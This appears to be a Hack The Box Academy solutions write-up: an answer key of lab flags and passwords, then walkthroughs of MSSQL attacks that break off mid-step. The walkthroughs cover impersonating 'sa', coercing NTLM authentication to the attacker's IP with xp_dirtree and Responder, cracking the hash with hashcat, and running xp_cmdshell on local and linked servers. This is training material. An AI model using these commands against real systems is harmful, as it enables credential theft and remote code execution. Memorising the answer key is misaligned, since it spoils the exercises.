| Section | Question Number | Answer |
| --- | --- | --- |
| Introduction to MSSQL Server | Question 1 | db\_datareader |
| Introduction to MSSQL Server | Question 2 | privesc |
| Privilege Escalation | Question 1 | 5ca4d573057dc43c9dd6f4c7fcce7b5e |
| Privilege Escalation | Question 2 | orosql@25 |
| Command Execution | Question 1 | 005044caf5b6c699e787a99724da05bb |
| Lateral Movement | Question 1 | f7b06483c0d69434e84d3897a6c7e186 |
| Lateral Movement | Question 2 | yjwxm6b51N9nwiN8mCpB |
| Tools of the Trade | Question 1 | Medium |
| MSSQL Defensive Considerations | Question 1 | 16.0.1000.6 |
| MSSQL Defensive Considerations | Question 2 | 2147483647 |
| MSSQL Defensive Considerations | Question 3 | 1433 |
| Introduction to Exchange | Question 1 | c}71ub#4Fqq^ |
| Introduction to Exchange | Question 2 | https://oracle-db.inlanefreight.com |
| Introduction to Exchange | Question 3 | m.novak@inlanefreight.local |
| Enumeration | Question 1 | 14 |
| Enumeration | Question 2 | 15.2.721.2 |
| Enumeration | Question 3 | j.hull@inlanefreight.local |
| Enumeration | Question 4 | HTB{7o\_Be\_0r\_n077\_pwn3d} |
| Vulnerabilities | Question 1 | HTB{Whoop$iee\_5gda3ws} |
| Phishing Attacks | Question 1 | Tigger1! |
| Phishing Attacks | Question 2 | I\_GoT\_Phished |
| Introduction to SCCM | Question 1 | Password1 |
| Introduction to SCCM | Question 2 | Welcome01$ |
| Introduction to SCCM | Question 3 | Account\_Used\_To\_DomainJoin |
| Introduction to SCCM | Question 4 | Config\_The\_Same\_LocalAdmin |
| SCCM Auditing | Question 1 | Rai |
| SCCM Auditing | Question 2 | SCCM01 |
| SCCM Auditing | Question 3 | SCCM01 |
| SCCM Auditing | Question 4 | SCCM02 |
| Abusing SCCM | Question 1 | Pxetesting01 |
| Abusing SCCM | Question 2 | adm1n5ccM! |
| Abusing SCCM | Question 3 | If needed : pusH\_4ccoun7! |
| Abusing SCCM | Question 4 | NNA\_4cc0unt! |
| SCCM Site Takeover I | Question 1 | 2024-05-10 10:12:57 |
| SCCM Site Takeover I | Question 2 | 0x0105000000000005150000004b2233992a9592e9d78a99dad3040000 |
| SCCM Site Takeover I | Question 3 | Abus1ng\_MSSQL\_To\_Compromise\_SCCM |
| SCCM Site Takeover II | Question 1 | NLTM\_Relay\_SCCM\_Abuse |
| SCCM Site Takeover II | Question 2 | PWN\_SCCM\_With\_PasiveServer\_Coerce |
| SCCM Post Exploitation | Question 1 | GUID:BD861888-7840-427C-9CC6-D4FFE022F55A |
| SCCM Post Exploitation | Question 2 | LAB\\SCCM02$ |
| SCCM Post Exploitation | Question 3 | Read\_With\_SCCM |
| Skills Assessment | Question 1 | Freightlogistics\_October |
| Skills Assessment | Question 2 | Ron.McGinnis |
| Skills Assessment | Question 3 | b7cdb05141a266d799d59aa3ba418cec |
| Skills Assessment | Question 4 | SCCM\_Compromised\_9301 |
| Skills Assessment | Question 5 | DA\_Access\_Pwn\_Windows\_Services |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Introduction to MSSQL Server

## Question 1

### "Connect to the MSSQL Server using either mssqclient or SSMS, and enumerate the server. What role does the ws\_dev user have in the webshop database?"

After spawning the target, students will establish an RDP session using the provided credentials `student:FMTqQUwmDLFuWFpR55qD`:

Code: shell

```shell
xfreerdp /v:STMIP /u:student /p:FMTqQUwmDLFuWFpR55qD /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-ktfto6km1i]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.240 /u:student /p:FMTqQUwmDLFuWFpR55qD /dynamic-resolution

[01:04:15:588] [7713:7714] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[01:04:15:588] [7713:7714] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[01:04:15:588] [7713:7714] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[01:04:15:644] [7713:7714] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[01:04:15:644] [7713:7714] [WARN][com.freerdp.crypto] - CN = SQL01.htb.local
[01:04:15:645] [7713:7714] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:04:15:645] [7713:7714] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[01:04:15:645] [7713:7714] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:04:15:645] [7713:7714] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.240:3389) 
[01:04:15:645] [7713:7714] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[01:04:15:645] [7713:7714] [ERROR][com.freerdp.crypto] - Common Name (CN):
[01:04:15:645] [7713:7714] [ERROR][com.freerdp.crypto] - 	SQL01.htb.local
[01:04:15:645] [7713:7714] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.240:3389 (RDP-Server):
	Common Name: SQL01.htb.local
	Subject:     CN = SQL01.htb.local
	Issuer:      CN = SQL01.htb.local
	Thumbprint:  b7:2d:69:42:f4:73:bb:cc:00:52:69:99:c0:5d:b5:78:03:3c:4a:a4:a0:39:c0:d8:17:4e:9e:47:1a:fe:b1:99
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

They will open `SQL Server Management Studio 20` (`SSMS`):

![[HTB Solutions/CAPE/z. images/e4651b6bdd567ba94f995281ed3235da_MD5.jpg]]

Subsequently, they will use the provided password (`4X6cuvDLNer7nwYN5LBZ`) in the section of `ws_dev` to connect to `SQL01`:

![[HTB Solutions/CAPE/z. images/de5bbd1ba5dd204c931a775a6c224e22_MD5.jpg]]

Students will use the following `T-SQL` query to change to the `webshop` database and get information about the database-level principals. They will place the query within the `New Query` functionality and execute it:

Code: sql

```sql
USE webshop;
EXECUTE sp_helpuser;
```

![[HTB Solutions/CAPE/z. images/d11ac5a8d20f7552b867238e196995ad_MD5.jpg]]

Students will find the answer in the fifth row and the second column in the results.

Answer: `db_datareader`

# Introduction to MSSQL Server

## Question 2

### "What is the name of the database with database\_id 6?"

Students will reuse the previously established sessions and will perform an enumeration of the databases and the principals using the following `T-SQL` query:

Code: sql

```sql
SELECT a.name AS 'database', b.name AS 'owner' 
FROM sys.databases a 
JOIN sys.server_principals b ON a.owner_sid = b.sid;
```

![[HTB Solutions/CAPE/z. images/3b4314767f626007f030eebd950567e1_MD5.jpg]]

Students will find the answer in the sixth row and first column.

Answer: `privesc`

# Privilege Escalation

## Question 1

### "Escalate to 'sa' and find the flag inside the 'privesc' database."

After spawning the target, students will clone the Impacket repository from Github, create a Python virtual environment, and install the requirements:

Code: shell

```shell
git clone https://github.com/fortra/impacket 
cd impacket 
python3 -m venv .impacket 
source .impacket/bin/activate 
python3 -m pip install .
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-dtzalsiqb1]─[~]
└──╼ [★]$ git clone https://github.com/fortra/impacket
cd impacket
python3 -m venv .impacket
source .impacket/bin/activate
python3 -m pip install .

Cloning into 'impacket'...
remote: Enumerating objects: 23787, done.
remote: Counting objects: 100% (358/358), done.
remote: Compressing objects: 100% (236/236), done.
remote: Total 23787 (delta 210), reused 225 (delta 122), pack-reused 23429 (from 1)
Receiving objects: 100% (23787/23787), 10.42 MiB | 14.04 MiB/s, done.
Resolving deltas: 100% (18004/18004), done.
Processing /home/htb-ac-8414/impacket
  Preparing metadata (setup.py) ... done
<SNIP>
```

Subsequently, students will utilize `mssqclient.py` located in the `examples/` directory and connect using the credentials `ws_dev:4X6cuvDLNer7nwYN5LBZ`:

Code: shell

```shell
python3 examples/mssqlclient.py ws_dev:4X6cuvDLNer7nwYN5LBZ@STMIP
```

```
(.impacket) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-dtzalsiqb1]─[~/impacket]
└──╼ [★]$ python3 examples/mssqlclient.py ws_dev:4X6cuvDLNer7nwYN5LBZ@10.129.37.27

Impacket v0.12.0.dev1+20240819.165705.f98c9870 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01): Line 1: Changed database context to 'master'.
[*] INFO(SQL01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (ws_dev  guest@master)>
```

Subsequently, students will enumerate the logins they can impersonate using the `enum_impersonate` functionality:

Code: shell

```shell
enum_impersonate
```

```
SQL (ws_dev  guest@master)> enum_impersonate

execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
b'LOGIN'     b''        IMPERSONATE       GRANT        ws_dev    sa        

b'LOGIN'     b''        IMPERSONATE       GRANT        ws_dev    ws_user 
```

They will learn that the user `ws_dev` can impersonate the user `sa`. Students will impersonate the user using the `exec_as_login` functionality, change the database to `privesc`, and query the database tables.

Code: shell

```shell
exec_as_login sa
use privesc;
SELECT * FROM INFORMATION_SCHEMA.TABLES;
```

```
SQL (ws_dev  guest@master)> exec_as_login sa

SQL (sa  dbo@master)> use privesc;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: privesc
[*] INFO(SQL01): Line 1: Changed database context to 'privesc'.

SQL (sa  dbo@privesc)> SELECT * FROM INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
privesc         dbo            Flag         b'BASE TABLE'
```

Students will find that the database holds a single table named `Flag`. Subsequently, students will proceed to query the table and attain the flag.

Code: sql

```sql
SELECT * FROM Flag;
```

```
SQL (sa  dbo@privesc)> SELECT * FROM Flag;
ID   MD5                                   
--   -----------------------------------   
 1   b'{hidden}'
```

Answer: `5ca4d573057dc43c9dd6f4c7fcce7b5e`

# Privilege Escalation

## Question 2

### "Capture and crack the NetNTLM hash for HTB\\svc\_sql. What is the password?"

Students will reuse the previously spawned target and `mssqlclient.py` session. Subsequently, they will open a new terminal tab and start `Responder` to capture the NTLM hash (authentication):

Code: shell

```shell
sudo responder -I tun0
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-dtzalsiqb1]─[~/impacket]
└──╼ [★]$ sudo responder -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
<SNIP>
```

Students will return to the `mssqlclient.py` tab/session and use the `xp_dirtree` stored procedure to initiate a connection (authentication) to themselves.

Code: sql

```sql
EXEC xp_dirtree '\\PWNIP\academy-student';
```

```
SQL (sa  dbo@privesc)> EXEC xp_dirtree '\\10.10.14.68\academy-student';
subdirectory   depth   
------------   -----   
```

Once they have executed the stored procedure, students will notice that the hash of the user `HTB\svc_sql` was captured by Responder.

```
<SNIP>
SMB] NTLMv2-SSP Client   : 10.129.37.27
[SMB] NTLMv2-SSP Username : HTB\svc_sql
[SMB] NTLMv2-SSP Hash     : svc_sql::HTB:0a3ec010df1a9dfd:0A42D464EE7D8CF0891C4D01CB181F51:010100000000000000B440FC6BF3DA01A64B4BC0FC31D8970000000002000800530033004D00520001001E00570049004E002D005400570039004300450035005300370056004900540004003400570049004E002D00540057003900430045003500530037005600490054002E00530033004D0052002E004C004F00430041004C0003001400530033004D0052002E004C004F00430041004C0005001400530033004D0052002E004C004F00430041004C000700080000B440FC6BF3DA0106000400020000000800300030000000000000000000000000300000F42D73429BF1878A49F6A7B1C61C019DE8F55EA136CD453441443013FE8EF2560A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360038000000000000000000
[*] Skipping previously captured hash for HTB\svc_sql
[*] Skipping previously captured hash for HTB\svc_sql
<SNIP>
```

Students will terminate Responder, are going to use `hashcat` and mode `5600`, and specifying `rockyou` as a dictionary file to crack the captured hash.

Code: shell

```shell
hashcat -m 5600 'svc_sql::HTB:0a3ec010df1a9dfd:0A42D464EE7D8CF0891C4D01CB181F51:010100000000000000B440FC6BF3DA01A64B4BC0FC31D8970000000002000800530033004D00520001001E00570049004E002D005400570039004300450035005300370056004900540004003400570049004E002D00540057003900430045003500530037005600490054002E00530033004D0052002E004C004F00430041004C0003001400530033004D0052002E004C004F00430041004C0005001400530033004D0052002E004C004F00430041004C000700080000B440FC6BF3DA0106000400020000000800300030000000000000000000000000300000F42D73429BF1878A49F6A7B1C61C019DE8F55EA136CD453441443013FE8EF2560A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360038000000000000000000' /usr/share/wordlists/rockyou.txt.gz
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-dtzalsiqb1]─[~/impacket]
└──╼ [★]$ hashcat -m 5600 'svc_sql::HTB:0a3ec010df1a9dfd:0A42D464EE7D8CF0891C4D01CB181F51:010100000000000000B440FC6BF3DA01A64B4BC0FC31D8970000000002000800530033004D00520001001E00570049004E002D005400570039004300450035005300370056004900540004003400570049004E002D00540057003900430045003500530037005600490054002E00530033004D0052002E004C004F00430041004C0003001400530033004D0052002E004C004F00430041004C0005001400530033004D0052002E004C004F00430041004C000700080000B440FC6BF3DA0106000400020000000800300030000000000000000000000000300000F42D73429BF1878A49F6A7B1C61C019DE8F55EA136CD453441443013FE8EF2560A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360038000000000000000000' /usr/share/wordlists/rockyou.txt.gz

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

<SNIP>

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

SVC_SQL::HTB:0a3ec010df1a9dfd:0a42d464ee7d8cf0891c4d01cb181f51:010100000000000000b440fc6bf3da01a64b4bc0fc31d8970000000002000800530033004d00520001001e00570049004e002d005400570039004300450035005300370056004900540004003400570049004e002d00540057003900430045003500530037005600490054002e00530033004d0052002e004c004f00430041004c0003001400530033004d0052002e004c004f00430041004c0005001400530033004d0052002e004c004f00430041004c000700080000b440fc6bf3da0106000400020000000800300030000000000000000000000000300000f42d73429bf1878a49f6a7b1c61c019de8f55ea136cd453441443013fe8ef2560a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00360038000000000000000000:{hidden}

<SNIP>
```

Students will proceed to reuse `hashcat` to show the cracked password, which they will submit as an answer:

Code: shell

```shell
hashcat -m 5600 'svc_sql::HTB:0a3ec010df1a9dfd:0A42D464EE7D8CF0891C4D01CB181F51:010100000000000000B440FC6BF3DA01A64B4BC0FC31D8970000000002000800530033004D00520001001E00570049004E002D005400570039004300450035005300370056004900540004003400570049004E002D00540057003900430045003500530037005600490054002E00530033004D0052002E004C004F00430041004C0003001400530033004D0052002E004C004F00430041004C0005001400530033004D0052002E004C004F00430041004C000700080000B440FC6BF3DA0106000400020000000800300030000000000000000000000000300000F42D73429BF1878A49F6A7B1C61C019DE8F55EA136CD453441443013FE8EF2560A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360038000000000000000000' /usr/share/wordlists/rockyou.txt.gz --show
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-dtzalsiqb1]─[~/impacket]
└──╼ [★]$ hashcat -m 5600 'svc_sql::HTB:0a3ec010df1a9dfd:0A42D464EE7D8CF0891C4D01CB181F51:010100000000000000B440FC6BF3DA01A64B4BC0FC31D8970000000002000800530033004D00520001001E00570049004E002D005400570039004300450035005300370056004900540004003400570049004E002D00540057003900430045003500530037005600490054002E00530033004D0052002E004C004F00430041004C0003001400530033004D0052002E004C004F00430041004C0005001400530033004D0052002E004C004F00430041004C000700080000B440FC6BF3DA0106000400020000000800300030000000000000000000000000300000F42D73429BF1878A49F6A7B1C61C019DE8F55EA136CD453441443013FE8EF2560A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360038000000000000000000' /usr/share/wordlists/rockyou.txt.gz --show

SVC_SQL::HTB:0a3ec010df1a9dfd:0a42d464ee7d8cf0891c4d01cb181f51:010100000000000000b440fc6bf3da01a64b4bc0fc31d8970000000002000800530033004d00520001001e00570049004e002d005400570039004300450035005300370056004900540004003400570049004e002d00540057003900430045003500530037005600490054002e00530033004d0052002e004c004f00430041004c0003001400530033004d0052002e004c004f00430041004c0005001400530033004d0052002e004c004f00430041004c000700080000b440fc6bf3da0106000400020000000800300030000000000000000000000000300000f42d73429bf1878a49f6a7b1c61c019de8f55ea136cd453441443013fe8ef2560a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00360038000000000000000000:{hidden}
```

Answer: `orosql@25`

# Command Execution

## Question 1

### "Use one of the techniques discussed here to read the value of C:\\flag.txt"

After spawning the target, students will clone the Impacket repository from Github, create a Python virtual environment, and install the requirements:

Code: shell

```shell
git clone https://github.com/fortra/impacket 
cd impacket 
python3 -m venv .impacket 
source .impacket/bin/activate 
python3 -m pip install .
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-dtzalsiqb1]─[~]
└──╼ [★]$ git clone https://github.com/fortra/impacket
cd impacket
python3 -m venv .impacket
source .impacket/bin/activate
python3 -m pip install .

Cloning into 'impacket'...
remote: Enumerating objects: 23787, done.
remote: Counting objects: 100% (358/358), done.
remote: Compressing objects: 100% (236/236), done.
remote: Total 23787 (delta 210), reused 225 (delta 122), pack-reused 23429 (from 1)
Receiving objects: 100% (23787/23787), 10.42 MiB | 14.04 MiB/s, done.
Resolving deltas: 100% (18004/18004), done.
Processing /home/htb-ac-8414/impacket
  Preparing metadata (setup.py) ... done
<SNIP>
```

Subsequently, students will utilize `mssqclient.py` located in the `examples/` directory and connect using the credentials `ws_dev:4X6cuvDLNer7nwYN5LBZ`:

Code: shell

```shell
python3 examples/mssqlclient.py ws_dev:4X6cuvDLNer7nwYN5LBZ@STMIP
```

```
(.impacket) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-dtzalsiqb1]─[~/impacket]
└──╼ [★]$ python3 examples/mssqlclient.py ws_dev:4X6cuvDLNer7nwYN5LBZ@10.129.37.27

Impacket v0.12.0.dev1+20240819.165705.f98c9870 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01): Line 1: Changed database context to 'master'.
[*] INFO(SQL01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (ws_dev  guest@master)>
```

Subsequently, students will enumerate the logins they can impersonate using the `enum_impersonate` functionality:

Code: shell

```shell
enum_impersonate
```

```
SQL (ws_dev  guest@master)> enum_impersonate

execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
b'LOGIN'     b''        IMPERSONATE       GRANT        ws_dev    sa        

b'LOGIN'     b''        IMPERSONATE       GRANT        ws_dev    ws_user 
```

Students will learn that the user `ws_dev` can impersonate the user `sa`. They will impersonate the user using the `exec_as_login` functionality and enable `xp_cmdshell` using the `enable_xp_cmdshell` stored procedure.

Code: shell

```shell
exec_as_login sa
enable_xp_cmdshell
```

```
SQL (ws_dev  guest@master)> exec_as_login sa
SQL (sa  dbo@master)> enable_xp_cmdshell

[*] INFO(SQL01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(SQL01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Subsequently, students can grab the flag from `C:\` using `xp_cmdshell`:

Code: shell

```shell
xp_cmdshell type C:\flag.txt
```

```
SQL (sa  dbo@master)> xp_cmdshell type C:\flag.txt
output                             
--------------------------------   
{hidden}  
```

Answer: `005044caf5b6c699e787a99724da05bb`

# Lateral Movement

## Question 1

### "Use the techniques covered here to read the value of C:\\flag\_XXXXX.txt on SQL02."

After spawning the target, students will clone the Impacket repository from Github, create a Python virtual environment, and install the requirements:

Code: shell

```shell
git clone https://github.com/fortra/impacket 
cd impacket 
python3 -m venv .impacket 
source .impacket/bin/activate 
python3 -m pip install .
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-dtzalsiqb1]─[~]
└──╼ [★]$ git clone https://github.com/fortra/impacket
cd impacket
python3 -m venv .impacket
source .impacket/bin/activate
python3 -m pip install .

Cloning into 'impacket'...
remote: Enumerating objects: 23787, done.
remote: Counting objects: 100% (358/358), done.
remote: Compressing objects: 100% (236/236), done.
remote: Total 23787 (delta 210), reused 225 (delta 122), pack-reused 23429 (from 1)
Receiving objects: 100% (23787/23787), 10.42 MiB | 14.04 MiB/s, done.
Resolving deltas: 100% (18004/18004), done.
Processing /home/htb-ac-8414/impacket
  Preparing metadata (setup.py) ... done
<SNIP>
```

Subsequently, students will utilize `mssqclient.py` located in the `examples/` directory and connect using the credentials `ws_dev:4X6cuvDLNer7nwYN5LBZ`:

Code: shell

```shell
python3 examples/mssqlclient.py ws_dev:4X6cuvDLNer7nwYN5LBZ@STMIP
```

```
(.impacket) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-dtzalsiqb1]─[~/impacket]
└──╼ [★]$ python3 examples/mssqlclient.py ws_dev:4X6cuvDLNer7nwYN5LBZ@10.129.37.27

Impacket v0.12.0.dev1+20240819.165705.f98c9870 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01): Line 1: Changed database context to 'master'.
[*] INFO(SQL01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (ws_dev  guest@master)>
```

Subsequently, students will enumerate the linked databases using the `enum_links` functionality:

Code: shell

```shell
enum_links
```

```
SQL (ws_dev  guest@master)> enum_links

SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
SQL01      SQLNCLI            SQL Server    SQL01            NULL                 NULL           NULL      

SQL02      SQLNCLI            SQL Server    SQL02            NULL                 NULL           NULL      

Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------ 
```

Once students have enumerated the links, they will proceed to execute queries to enable the `xp_cmdshell` stored procedure on `SQL02`, and list the contents of the `C:\` directory:

Code: sql

```sql
EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "dir C:\";') AT SQL02;
```

```
SQL (ws_dev  guest@master)> EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "dir C:\";') AT SQL02;

[*] INFO(SQL02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(SQL02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
output                                                       
----------------------------------------------------------   
 Volume in drive C has no label.                             
 Volume Serial Number is 6039-A943                           

NULL                                                         

 Directory of C:\                                            

NULL                                                         

08/01/2024  01:10 PM                32 flag_9f46b.txt        
02/25/2022  11:20 AM    <DIR>          PerfLogs              
07/09/2024  08:49 AM    <DIR>          Program Files         
05/13/2024  03:28 PM    <DIR>          Program Files (x86)   
05/13/2024  03:13 PM    <DIR>          SQL2022               
05/13/2024  04:00 PM    <DIR>          Users                 
08/01/2024  01:07 PM    <DIR>          Windows               

               1 File(s)             32 bytes                
               6 Dir(s)   7,537,438,720 bytes free           
NULL                                        
```

Having obtained the name of the file holding the flag, students will proceed to query the contents of the file:

Code: sql

```sql
EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "type C:\flag_9f46b.txt";') AT SQL02;
```

```
SQL (ws_dev  guest@master)> EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "type C:\flag_9f46b.txt";') AT SQL02;

[*] INFO(SQL02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(SQL02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
output                             
--------------------------------   
{hidden} 
```

Answer: `f7b06483c0d69434e84d3897a6c7e186`

# Lateral Movement

## Question 2

### "The answer to the previous question is the password of SQL02\\Administrator, who is both a local administrator, as well as a sysadmin. Connect via RDP to SQL02, and reproduce the attack to decrypt ws\_user's password."

Students will reuse the previously spawned target and will establish an RDP session using the credentials `student:FMTqQUwmDLFuWFpR55qD`:

Code: shell

```shell
xfreerdp /v:STMIP /u:student /p:FMTqQUwmDLFuWFpR55qD /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-vnku5bsdh4]─[~]
└──╼ [★]$ xfreerdp /v:10.129.202.72 /u:student /p:FMTqQUwmDLFuWFpR55qD /dynamic-resolution

[03:06:56:157] [47553:47554] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[03:06:56:157] [47553:47554] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[03:06:56:157] [47553:47554] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[03:06:56:208] [47553:47554] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[03:06:56:208] [47553:47554] [WARN][com.freerdp.crypto] - CN = SQL01.htb.local
[03:06:56:209] [47553:47554] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:06:56:209] [47553:47554] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:06:56:209] [47553:47554] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:06:56:209] [47553:47554] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.202.72:3389) 
[03:06:56:210] [47553:47554] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:06:56:210] [47553:47554] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:06:56:210] [47553:47554] [ERROR][com.freerdp.crypto] - 	SQL01.htb.local
[03:06:56:210] [47553:47554] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.202.72:3389 (RDP-Server):
	Common Name: SQL01.htb.local
	Subject:     CN = SQL01.htb.local
	Issuer:      CN = SQL01.htb.local
	Thumbprint:  b7:2d:69:42:f4:73:bb:cc:00:52:69:99:c0:5d:b5:78:03:3c:4a:a4:a0:39:c0:d8:17:4e:9e:47:1a:fe:b1:99
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students will open the `Remote Desktop Connection` application:

![[HTB Solutions/CAPE/z. images/b9a306b70339ec78e31813d8f8d16e3a_MD5.jpg]]

Connect to `SQL02` as an `Administrator` and use the answer from the previous question as a password:

![[HTB Solutions/CAPE/z. images/41f12a1b601d3acad2dbc1223419214d_MD5.jpg]]

Once connected, students will open `PowerShell`, navigate to `C:\Users\Administrator\Desktop`, and import `Get-MSSQLLinkPasswords.psm1`:

Code: powershell

```powershell
cd C:\Users\Administrator\Desktop
Import-Module .\Get-MSSQLLinkPasswords.psm1
```

```
Windows PowerShell
